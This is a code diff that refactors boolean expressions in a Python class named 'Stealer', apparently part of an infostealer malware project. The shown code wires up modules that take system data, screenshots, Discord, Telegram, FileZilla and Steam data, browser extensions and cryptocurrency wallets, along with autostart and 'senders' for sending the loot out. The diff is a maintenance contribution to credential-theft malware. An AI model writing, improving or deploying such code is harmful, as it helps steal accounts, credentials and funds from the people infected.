@@ -47,8 +47,8 @@ class Stealer(Thread):
             self.__protectors = protectors
 
         self.__senders = senders
-        self.__autostart = True if Utils.autostart in utils else False
-        self.__message = True if Utils.message in utils else False
+        self.__autostart = Utils.autostart in utils
+        self.__message = Utils.message in utils
         self.__delay = delay
 
         self.__config = MultistealerConfig()
@@ -63,7 +63,7 @@ class Stealer(Thread):
             Features.extensions,
             Features.wallets
         ] if module in features or Features.all in features]
-        browser_statuses = True if len(browser_functions) > 0 else False
+        browser_statuses = len(browser_functions) > 0
 
         self.__methods = [
             {
@@ -141,56 +141,56 @@ class Stealer(Thread):
                 "arguments": (
                     "System",
                 ),
-                "status": True if (Features.system in features or Features.all in features) else False
+                "status": Features.system in features or Features.all in features
             },
             {
                 "object": Processes,
                 "arguments": (
                     "System",
                 ),
-                "status": True if (Features.processes in features or Features.all in features) else False
+                "status": Features.processes in features or Features.all in features
             },
             {
                 "object": Screenshot,
                 "arguments": (
                     "System",
                 ),
-                "status": True if (Features.screenshot in features or Features.all in features) else False
+                "status": Features.screenshot in features or Features.all in features
             },
             {
                 "object": Discord,
                 "arguments": (
                     "Programs/Discord",
                 ),
-                "status": True if (Features.discord in features or Features.all in features) else False
+                "status": Features.discord in features or Features.all in features
             },
             {
                 "object": Telegram,
                 "arguments": (
                     "Programs/Telegram",
                 ),
-                "status": True if (Features.telegram in features or Features.all in features) else False
+                "status": Features.telegram in features or Features.all in features
             },
             {
                 "object": FileZilla,
                 "arguments": (
                     "Programs/FileZilla",
                 ),
-                "status": True if (Features.filezilla in features or Features.all in features) else False
+                "status": Features.filezilla in features or Features.all in features
             },
             {
                 "object": Steam,
                 "arguments": (
                     "Programs/Steam",
                 ),
-                "status": True if (Features.steam in features or Features.all in features) else False
+                "status": Features.steam in features or Features.all in features
             },
             {
                 "object": Wallets,
                 "arguments": (
                     "Wallets",
                 ),
-                "status": True if (Features.wallets in features or Features.all in features) else False
+                "status": Features.wallets in features or Features.all in features
             }
         ]
 
